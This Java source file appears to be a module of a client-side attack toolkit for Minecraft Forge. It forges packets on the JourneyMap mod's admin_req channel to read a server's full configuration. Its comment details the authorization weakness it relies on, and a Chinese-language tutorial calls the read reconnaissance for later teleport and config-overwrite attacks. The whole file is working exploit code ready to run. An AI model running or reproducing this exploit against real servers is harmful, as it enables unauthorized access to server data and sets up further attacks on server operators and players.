package com.redblue.red.modules.journeymap;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * JM-03: Admin Config Read / Information Disclosure
 *
 * Verified via javap:
 *   - Channel: journeymap:admin_req (separate SimpleChannel, discriminator=0)
 *   - Wire: writeByte(0) + writeByte(0x2A) + writeInt(type) + writeUtf(dimension) + writeUtf(payload)
 *   - Handler: PacketHandler.onAdminScreenOpen(player, type, dimension)
 *
 * Authorization in onAdminScreenOpen():
 *   1. canServerAdmin(player) -- admin/OP
 *   2. OR isClient() -- LAN bypass
 *   3. OR viewOnlyServerProperties == true -- common default for transparency
 *   If ANY is true, server responds with full config JSON.
 *
 * When viewOnlyServerProperties is enabled (common), ANY player can read:
 *   - GlobalProperties (type=1): teleport, radar, mapping settings
 *   - DefaultDimensionProperties (type=2)
 *   - Per-dimension properties (type=3)
 *
 * Response arrives as ServerAdminRequestPropPacket on client side.
 */
public class JM03_AdminConfigRead implements AttackModule {

    private static final ResourceLocation CHANNEL =
        new ResourceLocation("journeymap", "admin_req");
    private static final int DISCRIMINATOR = 0;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("target_type", "请求配置类型", "GLOBAL",
            "GLOBAL", "DEFAULT_DIM", "DIMENSION"),
        ConfigParam.ofString("dimension", "维度名 (DIMENSION类型时填写)",
            "minecraft:overworld")
            .visibleWhen("target_type", "DIMENSION")
    );

    @Override public String id() { return "jm03_admin_config_read"; }
    @Override public String name() { return "配置信息泄露"; }
    @Override public String description() { return "读取服务器JourneyMap完整配置 (viewOnly模式下任意玩家可用)"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 选择要读取的配置类型\n"
            + "2. 点击执行, 服务器会返回完整配置JSON\n"
            + "3. 返回数据会自动显示在聊天栏中\n\n"
            + "[前提条件]\n"
            + "服务器 viewOnlyServerProperties=true (常见默认值)\n"
            + "或者在LAN服务器上 / 拥有admin权限\n\n"
            + "[用途]\n"
            + "侦察服务器配置: 哪些维度启用了传送, 雷达范围等\n"
            + "为后续攻击(传送/配置覆写)收集情报";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("journeymap");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;

        String targetType = getParam("target_type")
            .map(ConfigParam::getString).orElse("GLOBAL");
        int typeId;
        switch (targetType) {
            case "DEFAULT_DIM": typeId = 2; break;
            case "DIMENSION":   typeId = 3; break;
            default:            typeId = 1; break;
        }

        String dimension = getParam("dimension")
            .map(ConfigParam::getString).orElse("");

        final int fType = typeId;
        final String fDim = dimension;

        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(DISCRIMINATOR);
            buf.writeByte(0x2A);
            buf.writeInt(fType);
            buf.writeUtf(fDim);
            buf.writeUtf("");  // payload (empty for read request)
        });
    }
}
